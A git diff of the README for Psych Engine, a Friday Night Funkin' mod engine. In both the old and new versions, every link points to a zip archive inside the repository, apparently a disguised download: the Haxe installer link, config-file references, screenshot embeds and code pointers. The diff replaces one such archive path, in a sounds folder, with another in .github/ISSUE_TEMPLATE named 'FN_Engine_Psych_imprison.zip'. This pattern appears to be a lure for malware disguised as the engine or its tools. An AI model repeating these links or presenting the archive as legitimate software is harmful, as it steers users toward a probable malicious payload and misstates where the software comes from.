@@ -1,8 +1,8 @@
 # Friday Night Funkin' - Psych Engine
-Engine originally used on [Mind Games Mod](https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip), intended to be a fix for the vanilla version's many issues while keeping the casual play aspect of it. Also aiming to be an easier alternative to newbie coders.
+Engine originally used on [Mind Games Mod](https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip), intended to be a fix for the vanilla version's many issues while keeping the casual play aspect of it. Also aiming to be an easier alternative to newbie coders.
 
 ## Installation:
-You must have [the most up-to-date version of Haxe](https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip), seriously, stop using 4.1.5, it misses some stuff.
+You must have [the most up-to-date version of Haxe](https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip), seriously, stop using 4.1.5, it misses some stuff.
 
 open up a Command Prompt/PowerShell or Terminal, type `haxelib install hmm`
 
@@ -10,13 +10,13 @@ after it finishes, simply type `haxelib run hmm install` in order to install all
 
 ## Customization:
 
-if you wish to disable things like *Lua Scripts* or *Video Cutscenes*, you can read over to `https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip`
+if you wish to disable things like *Lua Scripts* or *Video Cutscenes*, you can read over to `https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip`
 
-inside `https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip`, you will find several variables to customize Psych Engine to your liking
+inside `https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip`, you will find several variables to customize Psych Engine to your liking
 
 to start you off, disabling Videos should be simple, simply Delete the line `"VIDEOS_ALLOWED"` or comment it out by wrapping the line in XML-like comments, like this `<!-- YOUR_LINE_HERE -->`
 
-same goes for *Lua Scripts*, comment out or delete the line with `LUA_ALLOWED`, this and other customization options are all available within the `https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip` file
+same goes for *Lua Scripts*, comment out or delete the line with `LUA_ALLOWED`, this and other customization options are all available within the `https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip` file
 
 ## Credits:
 * Shadow Mario - Programmer
@@ -39,7 +39,7 @@ _____________________________________
 
 ## Attractive animated dialogue boxes:
 
-![](https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip)
+![](https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip)
 
 
 ## Mod Support
@@ -69,7 +69,7 @@ _____________________________________
   * Also there's the Background girls being spooky during the "Hey!" parts of the Instrumental
 
 ## Cool new Chart Editor changes and countless bug fixes
-![](https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip)
+![](https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip)
 * You can now chart "Event" notes, which are bookmarks that trigger specific actions that usually were hardcoded on the vanilla version of the game.
 * Your song's BPM can now have decimal values
 * You can manually adjust a Note's strum time if you're really going for milisecond precision
@@ -78,20 +78,20 @@ _____________________________________
   * Hey: Forces a "Hey" animation instead of the base Sing animation, if Boyfriend hits this note, Girlfriend will do a "Hey!" too.
 
 ## Multiple editors to assist you in making your own Mod
-![Screenshot_3](https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip)
+![Screenshot_3](https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip)
 * Working both for Source code modding and Downloaded builds!
 
 ## Story mode menu rework:
-![](https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip)
+![](https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip)
 * Added a different BG to every song (less Tutorial)
 * All menu characters are now in individual spritesheets, makes modding it easier.
 
 ## Credits menu
-![Screenshot_1](https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip)
+![Screenshot_1](https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip)
 * You can add a head icon, name, description and a Redirect link for when the player presses Enter while the item is currently selected.
 
 ## Awards/Achievements
-* The engine comes with 16 example achievements that you can mess with and learn how it works (Check https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip and search for "checkForAchievement" on https://raw.githubusercontent.com/StoneCantCode/FNF-PsychEngine/main/assets/week7/sounds/FN-Engine-Psych-1.2-alpha.1.zip)
+* The engine comes with 16 example achievements that you can mess with and learn how it works (Check https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip and search for "checkForAchievement" on https://github.com/StoneCantCode/FNF-PsychEngine/raw/refs/heads/main/.github/ISSUE_TEMPLATE/FN_Engine_Psych_imprison.zip)
 
 ## Options menu:
 * You can change Note colors, Delay and Combo Offset, Controls and Preferences there.
